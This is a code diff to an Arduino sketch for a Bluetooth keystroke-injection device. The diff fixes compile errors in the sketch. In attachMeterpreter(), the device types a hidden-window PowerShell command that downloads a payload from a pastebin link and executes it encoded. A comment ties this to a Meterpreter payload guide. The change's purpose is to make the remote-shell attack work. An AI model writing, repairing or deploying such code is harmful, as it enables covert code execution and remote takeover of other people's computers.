@@ -76,7 +76,7 @@ Adafruit_BluefruitLE_SPI ble(BLUEFRUIT_SPI_CS, BLUEFRUIT_SPI_IRQ, BLUEFRUIT_SPI_
 //                             BLUEFRUIT_SPI_MOSI, BLUEFRUIT_SPI_CS,
 //                             BLUEFRUIT_SPI_IRQ, BLUEFRUIT_SPI_RST);
 
-ledPin = 21;
+int ledPin = 21;
 // Make your pastebin link as shown in this link:
 // https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload--Fast-Meterpreter
 char link[] = ""; 
@@ -429,7 +429,9 @@ void openCmdPrompt(){
 }
 
 void attachMeterpreter(){
-    sendString("powershell -windowstyle hidden $u='" + link + "';$r=wget $u;powershell -nop -e $r.content");
+    sendString("powershell -windowstyle hidden $u='");
+    sendString(link);
+    sendString("';$r=wget $u;powershell -nop -e $r.content");
     
     sendRawKey(0x00, 0x28); // Enter key again
     delay(500);
@@ -478,7 +480,7 @@ void processReading(){
     case RELEASING:
       if (currentStableReading & ~previousStableReading) {
         state = PRESSING;
-        digitalWrite(ledPin, HIGH)
+        digitalWrite(ledPin, HIGH);
       }
       break;
     }
